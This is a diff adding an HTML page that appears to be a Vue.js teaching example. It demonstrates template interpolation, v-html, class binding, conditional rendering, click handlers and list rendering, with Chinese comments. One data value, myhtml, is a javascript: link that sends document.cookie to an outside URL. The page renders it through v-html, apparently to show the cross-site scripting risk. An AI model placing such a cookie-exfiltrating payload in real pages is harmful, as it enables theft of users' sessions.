@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>Examples</title>
+<meta name="description" content="">
+<meta name="keywords" content="kerwin qianfeng ">
+<link href="" rel="stylesheet">
+<script src="lib/vue.js"></script>
+
+
+<style>
+    .red{
+        background: red;
+    }
+
+    .yellow{
+        background: yellow;
+    }
+</style>
+
+</head>
+
+<body>
+    <div id="box">
+      {{10+20}}
+    
+      {{ title }}
+
+      {{ title + 'title' }}
+
+      {{ 10>20? 'aaa':'bbb'}}
+
+      {{ title.substring(0,1) }}
+
+      {{ myhtml }}
+
+      <br/>
+     
+       <div v-html="myhtml"></div>
+      <!-- 指令 v-html 专门负责显示带标签的代码片段 能够解析html-->
+
+      <div v-bind:class="isActive?'red':'yellow'">动态切换class</div>
+
+      <img :src="imgsrc"/>
+
+      <div v-if="isCreated">我是动态创建和删除</div>
+      <div v-show="isCreated">我是动态隐藏和显示</div>
+
+      <button v-on:click="handleKerwinClick()">click</button>
+      <button @click="handleKerwinClick()">click2</button>
+      <ul>
+        <li v-for="item,index in datalist">
+            {{item}}---------{{index}}
+        </li>
+      </ul>
+    </div>
+
+    <!-- {{10+20}}  -->
+    <script type="text/javascript">
+
+      var vm = new Vue({
+        el:"#box", // el 是固定的写法
+        data: { //data是放数据的地方， 将来可以通过改变数据 驱动页面更新
+          title:"kerwin",
+          isCreated:true,
+          myhtml:"<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>",
+          isActive:true,
+          datalist:[],
+          imgsrc:""
+        }, //状态
+
+        methods:{
+          handleKerwinClick:function(){
+            // console.log("111");
+            this.isActive = !this.isActive;
+            this.title="xiaoming";
+
+            setTimeout(() => {
+                this.imgsrc="https://static.maizuo.com/pc/v5/usr/movie/a2d61d2ac9452a246cba2354162fcab9.jpg?x-oss-process=image/quality,Q_70"
+
+                this.datalist= ["1111","22222","33333","55555","66666"]
+            }, 2000)
+          }
+        }
+      })
+
+      // var vm2= new Vue({
+      //   el:"#box2"
+      // })
+
+    </script>
+    
+</body>
+</html>
